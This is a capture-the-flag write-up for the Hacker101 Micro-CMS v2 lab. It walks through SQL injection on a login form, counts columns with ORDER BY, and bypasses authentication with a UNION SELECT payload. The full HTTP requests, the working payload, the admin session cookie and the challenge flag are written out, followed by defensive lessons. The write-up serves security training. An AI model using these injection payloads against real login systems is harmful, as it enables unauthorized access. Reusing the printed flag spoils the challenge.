================================
LAB: Micro-CMS v2 - Flag #1
================================

[LAB INFORMATION]
-----------------
Date: February 1, 2026
Lab URL: https://0d8005a07c1f2caf4a69a570ac7110b3.ctf.hacker101.com/
Category: SQL Injection / Authentication Bypass
Level: Medium
Objective: Bypass authentication using UNION-based SQL injection to access admin-only pages
Description: Micro-CMS v2 is a content management system with user authentication. The application added admin authentication for page editing. The challenge hint "more perfect union" suggests using SQL UNION techniques to bypass authentication.

[RECONNAISSANCE]
----------------
1. Application Mapping:
   - Home page (/) displays list of available pages
   - /page/1 - Micro-CMS Changelog (public)
   - /page/2 - Markdown Test (public)
   - /page/3 - Private Page (requires authentication)
   - /page/edit/{id} - Edit page endpoint (redirects to /login)
   - /page/create - Create new page (redirects to /login)
   - /login - Authentication form

2. Changelog Analysis (/page/1):
   GET /page/1 HTTP/2

   Response revealed:
   - "Version 2 fixed security flaws from v1"
   - "Added user authentication"
   - "Users need to be admin to add or edit pages"
   - Discovered edit endpoint: /page/edit/1

3. Authentication Form Analysis:
   GET /login HTTP/2

   Login form structure:
   - POST method to /login
   - Parameters: username (text), password (password)
   - Error messages displayed in <div style="color: red">
   - Content-Type: application/x-www-form-urlencoded

4. Initial Authentication Testing:
   POST /login HTTP/2
   Content-Type: application/x-www-form-urlencoded

   username=test&password=test

   Response: "Unknown user" in red div

   Key Finding: Application leaks information about username existence
   - "Unknown user" = username does not exist
   - Different message expected if username exists but password wrong

[VULNERABILITY DISCOVERY]
-------------------------
1. SQL Injection Detection - Basic Payload:
   Payload: username=test' OR 1=1--&password=test

   Response: HTTP/2 500 Internal Server Error

   Analysis:
   - SQL error confirms injection vulnerability
   - Query likely returns multiple rows, causing application crash
   - Backend cannot handle multiple user records

2. SQL Injection Refinement - Testing Comment Syntax:
   Multiple comment syntaxes tested:
   - username=' OR 1=1--&password=test → 500 error
   - username=' OR 1=1-- -&password=test → 500 error  
   - username=' OR 1=1 LIMIT 1#&password=test → "Invalid password"

   Success with MySQL hash comment (#):
   - Response changed from "Unknown user" to "Invalid password"
   - Confirms user record retrieved from database
   - Backend performs password comparison after SQL query

3. Column Count Discovery - ORDER BY Technique:
   Payload 1: username=' ORDER BY 1#&password=test
   Response: "Unknown user" (no error = column exists)

   Payload 2: username=' ORDER BY 2#&password=test
   Response: HTTP/2 500 Internal Server Error

   Conclusion: Query returns exactly 1 column (password field only)
   Reconstructed query: SELECT password FROM admins WHERE username='INPUT'

4. Understanding Backend Logic:
   The application architecture:
   1. SQL query retrieves password from database
   2. Backend code compares retrieved password with user input
   3. If match → create session and login
   4. If no match → "Invalid password"
   5. If no rows → "Unknown user"

[EXPLOITATION]
--------------
1. UNION-Based SQL Injection Strategy:
   Goal: Inject a known password value that we control

   Technique:
   - Use UNION SELECT to append custom row to query result
   - Inject password we know (e.g., 'hacked123')
   - Provide same password in POST parameter
   - Backend compares injected value with input → match succeeds

2. Crafting the Payload:
   username=' UNION SELECT 'hacked123'#&password=hacked123

   SQL Query Breakdown:
   Original: SELECT password FROM admins WHERE username='INPUT' AND password='...'

   Injected: SELECT password FROM admins WHERE username='' UNION SELECT 'hacked123'#' AND password='...'

   Execution flow:
   - WHERE username='' → returns 0 rows
   - UNION SELECT 'hacked123' → adds row with value 'hacked123'
   - # comments out rest of query (password check)
   - Result set: password = 'hacked123'

3. Backend Verification Process:
   result = query_result  # 'hacked123' from our UNION
   user_input = 'hacked123'  # from POST parameter

   if result == user_input:
       create_session(admin=true)
       return "Logged In!"

4. Exploitation Request:
   POST /login HTTP/2
   Host: 0d8005a07c1f2caf4a69a570ac7110b3.ctf.hacker101.com
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 57

   username=' UNION SELECT 'hacked123'#&password=hacked123

5. Successful Response:
   HTTP/2 200 OK
   Content-Type: text/html; charset=utf-8
   Content-Length: 382
   Set-Cookie: l2session=eyJhZG1pbiI6dHJ1ZX0.aX_bzQ.vbQB--evtTxspppF2VBAawfQaZE; HttpOnly; Path=/

   <!doctype html>
   <html>
   <head><title>Logged in</title></head>
   <body>
       <h1>Logged In!</h1>
       <a href="home">Go Home</a>
       <script>setTimeout(function() { window.location = 'home'; }, 3000);</script>
       <!-- You got logged in, congrats! Do you have the real username and password? If not, might want to do that! -->
   </body>
   </html>

6. Session Cookie Analysis:
   Cookie: l2session=eyJhZG1pbiI6dHJ1ZX0.aX_bzQ.vbQB--evtTxspppF2VBAawfQaZE

   Base64 decoded first part: {"admin":true}
   - JWT-like structure
   - Admin privileges granted
   - HttpOnly flag prevents JavaScript access

7. Accessing Admin Pages:
   GET /home HTTP/2
   Cookie: l2session=eyJhZG1pbiI6dHJ1ZX0.aX_bzQ.vbQB--evtTxspppF2VBAawfQaZE

   Response revealed new page:
   - /page/1 - Micro-CMS Changelog
   - /page/2 - Markdown Test
   - /page/3 - Private Page (NEW - previously hidden)
   - /page/create - Create new page option

8. Flag Retrieval:
   GET /page/3 HTTP/2
   Host: 0d8005a07c1f2caf4a69a570ac7110b3.ctf.hacker101.com
   Cookie: l2session=eyJhZG1pbiI6dHJ1ZX0.aX_bzQ.vbQB--evtTxspppF2VBAawfQaZE

   Response:
   HTTP/2 200 OK

   <!doctype html>
   <html>
   <head><title>Private Page</title></head>
   <body>
       <a href="../">&lt;-- Go Home</a><br>
       <a href="edit/3">Edit this page</a>
       <h1>Private Page</h1>
       <p>My secret is ^FLAG^603a2349226cd2de4c9c5f8bb45c3a9b35c4656a7d35c304eca5de7db6b15b60$FLAG$</p>
   </body>
   </html>

[EVIDENCE]
----------
Flag #1: 603a2349226cd2de4c9c5f8bb45c3a9b35c4656a7d35c304eca5de7db6b15b60

Attack Chain Summary:
1. Discovered SQL injection in login form username parameter
2. Determined query returns single column using ORDER BY
3. Crafted UNION SELECT payload with controlled password value
4. Bypassed authentication and received admin session cookie
5. Accessed hidden /page/3 containing flag

Complete Attack Request:
POST /login HTTP/2
Host: 0d8005a07c1f2caf4a69a570ac7110b3.ctf.hacker101.com
Content-Type: application/x-www-form-urlencoded

username=%27+UNION+SELECT+%27hacked123%27%23&password=hacked123

[LESSONS LEARNED]
-----------------
1. SQL Injection Fundamentals:
   - Always test authentication forms for SQL injection
   - Comment syntax varies by database (MySQL: #, --, PostgreSQL: --, SQL Server: --)
   - ORDER BY technique effectively determines column count
   - UNION SELECT requires matching column count and compatible data types

2. UNION-Based Authentication Bypass:
   - Single-column queries simplify exploitation
   - Can inject controlled values to bypass authentication logic
   - Particularly effective when application compares input against query result
   - Backend password verification can be exploited via SQL injection

3. Information Disclosure Impact:
   - Differential error messages enable attack refinement
   - "Unknown user" vs "Invalid password" reveals username existence
   - HTTP 500 errors often indicate SQL syntax errors
   - Consistent error messages prevent information leakage

4. Challenge Hints Analysis:
   - "More perfect union" directly references UNION SELECT technique
   - HTML comments in response suggest additional objectives
   - Multiple flags typically require different exploitation methods

5. Defensive Recommendations:
   - Use parameterized queries (prepared statements) exclusively
   - Implement generic error messages ("Invalid credentials")
   - Add rate limiting on authentication endpoints
   - Use Web Application Firewall (WAF) with SQL injection rules
   - Log authentication attempts for security monitoring
   - Implement account lockout after N failed attempts
   - Regular security audits and penetration testing
   - Encrypt sensitive data at rest
   - Use strong session management (rotate tokens, HttpOnly, Secure flags)

6. Testing Methodology:
   - Start with manual reconnaissance before automation
   - Test one parameter variation at a time
   - Document all requests and responses
   - Use methodical approach: detect → confirm → exploit
   - Verify database structure before complex queries
